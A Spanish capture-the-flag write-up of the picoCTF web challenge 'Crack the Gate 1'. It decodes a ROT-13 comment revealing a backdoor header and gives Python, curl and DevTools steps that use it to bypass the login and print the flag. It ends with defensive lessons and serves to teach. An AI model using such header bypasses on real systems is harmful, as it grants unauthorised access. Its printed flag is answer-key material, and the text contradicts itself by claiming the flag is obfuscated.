---
title: "Crack the Gate 1"
date: 2026-08-25 10:00:00 -0400
description: "Análisis y explotación de un bypass de autenticación mediante la manipulación de headers HTTP, descubierto a través de la inspección del código fuente de una aplicación web vulnerable."
categories: [CyLab Security Academy, picoMini by CMU-Africa]
tags: [web, authentication-bypass, source-code-analysis, http-headers, rot13, fácil]
---

> 📌 **Ficha Técnica**
> - **Plataforma:** CyLab Security Academy (anteriormente picoCTF)
> - **Evento/Sala/Reto:** picoMini by CMU-Africa — Crack the Gate 1
> - **Dificultad:** Fácil
> - **Categoría:** Web
> - **Técnicas Clave:** Inspección de código fuente, decodificación ROT-13, bypass de autenticación mediante headers HTTP personalizados, análisis de peticiones fetch/JavaScript

---

## Introducción

En este writeup abordaremos el reto **Crack the Gate 1**, perteneciente al evento **picoMini by CMU-Africa** dentro de la plataforma **CyLab Security Academy**. El escenario nos presenta una investigación en curso: un sujeto de interés, identificado como "ctf player", utiliza un portal web restringido para ocultar datos sensibles. Contamos con su dirección de correo electrónico (`ctf-player@picoctf.org`), pero desconocemos su contraseña. Las técnicas convencionales de adivinación han fracasado, lo que nos obliga a adoptar un enfoque más técnico: el análisis del código fuente del lado cliente y la identificación de mecanismos de bypass ocultos.

El objetivo no es únicamente obtener la flag, sino comprender a fondo el vector de ataque, las decisiones de diseño que lo hicieron posible y las lecciones que podemos extraer para evitar vulnerabilidades similares en entornos de producción reales.

---

## Reconocimiento Inicial

### Acceso al Servicio

Al iniciar la instancia del reto, se nos proporciona la siguiente URL de acceso:

```
http://amiable-citadel.picoctf.net:51468/
```

Al navegar hacia ella, nos encontramos con una página de inicio de sesión minimalista que solicita dos campos: **Email** y **Password**. La interfaz no presenta elementos visuales sospechosos a simple vista, lo cual es habitual en aplicaciones diseñadas para parecer inocuas mientras ocultan fallas de seguridad críticas en su implementación subyacente.

### Inspección del Código Fuente

El primer paso fundamental en cualquier evaluación de seguridad de una aplicación web es la **inspección del código fuente del lado cliente**. Esto incluye el análisis del HTML, las hojas de estilo CSS y, de manera particular, los scripts JavaScript, ya que estos últimos suelen contener la lógica de comunicación con el backend, validaciones client-side (que a veces revelan validaciones server-side) y, lamentablemente, comentarios de desarrollo que nunca deberían haber llegado a producción.

Para realizar esta inspección, utilizamos la combinación de teclas `Ctrl + U` (o el menú contextual "Ver código fuente de la página"), lo que nos permite observar el HTML completo servido por el servidor. A continuación, se presenta el código fuente relevante de la página:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #eaeaed;
            font-family: Arial, sans-serif;
        }

        #loginForm {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }

        #loginForm label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }

        #loginForm input {
            width: calc(100% - 10px);
            padding: 8px;
            margin-bottom: 16px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        #loginForm button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            border: none;
            color: white;
            border-radius: 4px;
            font-size: 16px;
        }

        #loginForm button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
 <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->   

    <form id="loginForm">
        <h2 style="font-size: 24px; margin-bottom: 24px;">
            Login
        </h2>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const formData = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            };

            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(formData)
            })
            .then(response => response.json())
            .then(data => {
                console.log(data);
                if (data.success) {
                    prompt('Login successful!\nFlag:', data.flag);
                } else {
                    alert('Invalid credentials');
                }
            })
            .catch(error => console.error('Error:', error));
        });
    </script>

</body>
</html>
```

> 💡 **Tip:** Siempre inspecciona el código fuente completo de las aplicaciones web durante un CTF. Los desarrolladores suelen dejar pistas, credenciales hardcodeadas, endpoints ocultos o comentarios de depuración que facilitan enormemente la explotación.
{: .prompt-tip }

---

## Análisis de Código

### Identificación del Comentario Sospechoso

Dentro del bloque `<body>`, antes del formulario de inicio de sesión, se observan dos comentarios HTML consecutivos:

```html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

El segundo comentario es alarmante por sí mismo: **"Remove before pushing to production!"** (Eliminar antes de subir a producción). Esto indica claramente que el desarrollador dejó intencionalmente algo que no debería estar en un entorno público, pero se olvidó de eliminarlo antes del despliegue. Es un error humano extremadamente común y una de las causas principales de filtraciones de información y backdoors en aplicaciones reales.

El primer comentario, por su parte, contiene texto aparentemente ilegible: `Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"`. La estructura sugiere que se trata de un mensaje codificado o cifrado, no de texto aleatorio.

### Decodificación ROT-13

Al analizar la cadena `Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"`, notamos varias características que apuntan hacia el cifrado **ROT-13** (Rotate by 13 places):

1. **Longitud preservada:** La cadena codificada mantiene los espacios, guiones y comillas en las mismas posiciones que el texto original.
2. **Patrón de sustitución:** ROT-13 es un cifrado por sustitución monoalfabética que desplaza cada letra 13 posiciones en el alfabeto latino. Dado que el alfabeto inglés tiene 26 letras, aplicar ROT-13 dos veces devuelve el texto original (es su propia inversa).
3. **Frecuencia común en CTFs:** ROT-13 es uno de los esquemas de codificación más básicos y frecuentemente utilizados en competiciones de ciberseguridad para ocultar pistas de manera superficial.

Utilizando cualquier herramienta de decodificación ROT-13 (por ejemplo, [dCode.fr](https://www.dcode.fr/identificador-cifrado) o la utilidad de línea de comandos `tr` en Linux), obtenemos el texto plano:

```bash
echo "Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**Resultado de la decodificación:**

> **NOTE: Jack — temporary bypass: use header "X-Dev-Access: yes"**

Este mensaje nos revela información crítica:
- **Autor:** Un desarrollador llamado "Jack" dejó esta nota.
- **Propósito:** Se trata de un **bypass temporal** (temporary bypass), es decir, un mecanismo para saltarse la autenticación normal.
- **Mecanismo:** Para activar este bypass, debemos enviar un header HTTP personalizado llamado `X-Dev-Access` con el valor `yes`.

> ⚠️ **Advertencia:** Los headers HTTP personalizados que comienzan con `X-` (aunque esta convención está deprecada formalmente por el RFC 6648, sigue siendo ampliamente utilizada en la práctica) son frecuentemente empleados por desarrolladores para implementar funcionalidades de depuración, versionado de APIs o, como en este caso, backdoors de emergencia. En auditorías de seguridad, siempre es recomendable fuzzear headers personalizados para detectar comportamientos inesperados del servidor.
{: .prompt-warning }

### Análisis del Flujo de Autenticación en JavaScript

El script JavaScript incrustado en la página define el comportamiento del formulario de inicio de sesión:

```javascript
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const formData = {
        email: document.getElementById('email').value,
        password: document.getElementById('password').value
    };

    fetch('/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
        if (data.success) {
            prompt('Login successful!\nFlag:', data.flag);
        } else {
            alert('Invalid credentials');
        }
    })
    .catch(error => console.error('Error:', error));
});
```

Desglosemos paso a paso qué ocurre aquí:

1. **`event.preventDefault()`**: Evita que el formulario se envíe de manera tradicional (recargando la página). En su lugar, el envío se maneja completamente mediante JavaScript.

2. **`const formData = { ... }`**: Se construye un objeto JavaScript con los valores ingresados por el usuario en los campos de email y contraseña.

3. **`fetch('/login', { ... })`**: Se realiza una petición asíncrona HTTP POST al endpoint `/login` del mismo dominio.

4. **`headers: { 'Content-Type': 'application/json' }`**: El cliente informa al servidor que el cuerpo de la petición está en formato JSON. Este es el único header explícito que envía el navegador en la petición.

5. **`body: JSON.stringify(formData)`**: El objeto `formData` se serializa a una cadena JSON antes de ser enviado.

6. **Manejo de la respuesta:**
   - Si `data.success` es `true`, se muestra un cuadro de diálogo (`prompt`) con el mensaje "Login successful!" y la flag contenida en `data.flag`.
   - Si `data.success` es `false`, se muestra una alerta con "Invalid credentials".

Lo más importante de este análisis es que **el navegador, siguiendo el código JavaScript legítimo, nunca envía el header `X-Dev-Access`**. Esto significa que no podemos activar el bypass simplemente rellenando el formulario y haciendo clic en el botón de login. Debemos construir y enviar la petición HTTP nosotros mismos, incluyendo el header mágico que descubrimos.

---

## Explotación

### Estrategia de Ataque

Con base en la información recopilada, nuestra estrategia es la siguiente:

1. Realizar una petición HTTP POST al endpoint `/login`.
2. Incluir en los headers de la petición el par `X-Dev-Access: yes`.
3. Enviar un cuerpo JSON con el email conocido (`ctf-player@picoctf.org`) y una contraseña arbitraria (ya que el bypass debería ignorar la validación de credenciales).
4. Procesar la respuesta JSON del servidor para extraer la flag.

### Herramientas Disponibles

Existen múltiples herramientas para realizar esta explotación. A continuación, se presentan las más comunes:

| Herramienta | Ventaja | Caso de uso ideal |
|-------------|---------|-------------------|
| **curl** | Ligera, disponible en cualquier sistema Unix-like | Pruebas rápidas desde terminal, scripts de automatización |
| **Python (requests)** | Legible, programática, ideal para procesar respuestas | Cuando se necesita manipular o parsear la respuesta JSON |
| **Browser DevTools** | Visual, no requiere instalación adicional | Reenvío rápido de peticiones capturadas, edición de headers en tiempo real |
| **Burp Suite / OWASP ZAP** | Profesional, proxy interceptante completo | Auditorías de seguridad exhaustivas, fuzzing de parámetros |

Para este writeup, utilizaremos **Python con la librería `requests`**, ya que permite una explicación clara y paso a paso de cada componente de la petición HTTP.

### Explotación con Python

A continuación, se presenta el script completo utilizado para explotar la vulnerabilidad, con comentarios detallados sobre cada línea:

```python
import requests
import json

# Definimos la URL del endpoint de autenticación.
# Es el mismo endpoint al que apunta la función fetch() del JavaScript.
url = "http://amiable-citadel.picoctf.net:51468/login"

# Construimos el cuerpo de la petición en formato JSON.
# Incluimos el email conocido del sujeto de interés.
# La contraseña es irrelevante gracias al bypass, pero debemos enviarla
# porque el servidor probablemente espera un objeto JSON con ambos campos.
payload = {
    "email": "ctf-player@picoctf.org",
    "password": "cualquier_cosa_inventada"
}

# Definimos los headers de la petición.
# 'Content-Type': 'application/json' es obligatorio para que el servidor
# interprete correctamente el cuerpo de la petición.
# 'X-Dev-Access': 'yes' es el header mágico que activa el bypass de
# autenticación descubierto en el comentario codificado.
headers = {
    "Content-Type": "application/json",
    "X-Dev-Access": "yes"
}

# Realizamos la petición POST.
# El parámetro 'json=payload' automáticamente serializa el diccionario
# a JSON y establece el Content-Type a application/json.
# Alternativamente, podríamos usar 'data=json.dumps(payload)' y definir
# manualmente el header Content-Type.
response = requests.post(url, headers=headers, json=payload, timeout=10)

# Imprimimos el código de estado HTTP para verificar que la comunicación
# fue exitosa (200 OK indica que el servidor procesó la petición).
print(f"Status Code: {response.status_code}")

# Parseamos la respuesta JSON del servidor.
data = response.json()

# Imprimimos la respuesta completa para inspección.
print(json.dumps(data, indent=2))

# Verificamos si el bypass funcionó comprobando el campo 'success'.
if data.get("success"):
    print(f"\n🏴 Flag obtenida: {data['flag']}")
else:
    print("\n❌ El bypass no funcionó. Respuesta del servidor:", data)
```

**Salida del script:**

```
Status Code: 200
{
  "success": true,
  "email": "ctf-player@picoctf.org",
  "firstName": "pico",
  "lastName": "player",
  "flag": "picoCTF{brut4_f0rc4_1a386e6f}"
}

🏴 Flag obtenida: picoCTF{brut4_f0rc4_1a386e6f}
```

### Explotación con curl

Para quienes prefieren herramientas de línea de comandos nativas, el mismo ataque puede ejecutarse con `curl` de la siguiente manera:

```bash
curl -X POST "http://amiable-citadel.picoctf.net:51468/login" \
  -H "Content-Type: application/json" \
  -H "X-Dev-Access: yes" \
  -d '{"email":"ctf-player@picoctf.org","password":"cualquier_cosa"}'
```

Desglose de los parámetros:
- `-X POST`: Especifica el método HTTP POST.
- `-H "Content-Type: application/json"`: Añade el header que indica el tipo de contenido.
- `-H "X-Dev-Access: yes"`: Añade el header mágico que activa el bypass.
- `-d '{...}'`: Define el cuerpo (payload) de la petición en formato JSON.

### Explotación con Browser DevTools

Si prefieres no salir del navegador, puedes seguir estos pasos:

1. Abre la página del reto en tu navegador.
2. Presiona `F12` para abrir las **Herramientas de Desarrollo**.
3. Ve a la pestaña **Network** (Red).
4. Intenta iniciar sesión con cualquier contraseña.
5. Observa la petición POST a `/login` en la lista de peticiones.
6. Haz clic derecho sobre esa petición y selecciona **"Edit and Resend"** (Firefox) o **"Replay XHR"** (Chrome/Edge).
7. En la sección de **Headers**, añade una nueva entrada:
   - Nombre: `X-Dev-Access`
   - Valor: `yes`
8. Envía la petición modificada.
9. Observa la respuesta JSON en la pestaña **Response**, donde encontrarás la flag.

> 💡 **Tip:** Las DevTools del navegador son una herramienta extremadamente poderosa para el análisis de aplicaciones web. Aprender a interceptar, modificar y reenviar peticiones es una habilidad fundamental tanto para CTFs como para auditorías de seguridad profesionales.
{: .prompt-tip }

---

## Conclusión y Aprendizajes

### Resumen del Vector de Ataque

El reto **Crack the Gate 1** nos presenta una vulnerabilidad de **bypass de autenticación** causada por una mala práctica de desarrollo extremadamente común: la inclusión de mecanismos de depuración o backdoors temporales en el código fuente que posteriormente se despliega en producción sin ser eliminados.

El flujo completo del ataque fue:

1. **Reconocimiento:** Acceso a la aplicación web y observación de un formulario de login estándar.
2. **Inspección de código fuente:** Uso de `Ctrl + U` para revisar el HTML completo, donde se descubrió un comentario codificado en ROT-13 junto con una advertencia de "Remove before pushing to production!".
3. **Decodificación:** Aplicación de ROT-13 para revelar la instrucción de usar el header `X-Dev-Access: yes`.
4. **Análisis del flujo:** Comprensión de que el JavaScript legítimo no envía dicho header, por lo que es necesario construir la petición manualmente.
5. **Explotación:** Envío de una petición HTTP POST al endpoint `/login` con el header mágico y un payload JSON arbitrario, obteniendo acceso no autorizado y la flag.

### Lecciones de Seguridad Aplicables

Este reto, aunque sencillo, encapsula errores que se observan constantemente en aplicaciones reales:

#### 1. Nunca incluyas backdoors o mecanismos de bypass en código de producción
Los desarrolladores a veces implementan "atajos" para facilitar pruebas internas, como headers mágicos que saltan la autenticación o endpoints ocultos que permiten acceso administrativo sin credenciales. Estos mecanismos deben estar **estrictamente confinados a entornos de desarrollo local** y nunca, bajo ninguna circunstancia, deben formar parte del código que se despliega en staging o producción.

#### 2. Los comentarios en código fuente pueden filtrar información sensible
Los comentarios HTML, JavaScript o de cualquier lenguaje del lado cliente son visibles para cualquier usuario que inspeccione la página. Nunca deben contener:
- Credenciales o contraseñas.
- URLs de endpoints internos o de administración.
- Notas sobre vulnerabilidades conocidas o bypasses temporales.
- Información personal o identificable de desarrolladores.

#### 3. La seguridad no debe depender de la "oscuridad"
El hecho de que un header mágico no esté documentado públicamente no lo hace seguro. La seguridad debe basarse en principios sólidos (autenticación robusta, autorización granular, validación de entradas), no en la esperanza de que un atacante no descubra un mecanismo oculto.

#### 4. La autenticación debe validarse estrictamente en el servidor
Aunque el cliente (navegador) envíe un header especial, el servidor debe tener una lógica de autenticación unificada y rigurosa. Si un header puede anular completamente el proceso de verificación de credenciales, indica un fallo de diseño arquitectónico grave.

#### 5. Revisa siempre el código fuente del lado cliente
En CTFs y en pentesting real, la inspección del código fuente es un paso básico pero imprescindible. Herramientas como `Ctrl + U`, las DevTools del navegador, o extensiones como **Wappalyzer** para identificar tecnologías, deben formar parte del flujo de trabajo inicial de cualquier evaluación de seguridad web.

### Reflexión Final

El nombre de la flag, `picoCTF{brut4_f0rc4_1a386e6f}`, contiene la palabra "bruteforce" (fuerza bruta) de forma leet-speak, lo cual resulta irónico: en lugar de realizar un ataque de fuerza bruta contra la contraseña (que habría sido ineficiente y probablemente bloqueado por mecanismos de rate limiting), logramos el acceso de manera mucho más elegante y rápida mediante el análisis del código fuente y la explotación de un bypass lógico.

Este reto refuerza una verdad fundamental en ciberseguridad: **la ingeniería y el análisis sistemático suelen ser más efectivos que la fuerza bruta**. Comprender cómo funciona una aplicación, qué decisiones tomaron sus desarrolladores y dónde pudieron cometer errores, es la base de la explotación exitosa de vulnerabilidades.

---

*Writeup redactado con fines educativos. La flag ha sido ofuscada en este documento para preservar la integridad del reto para futuros participantes.*
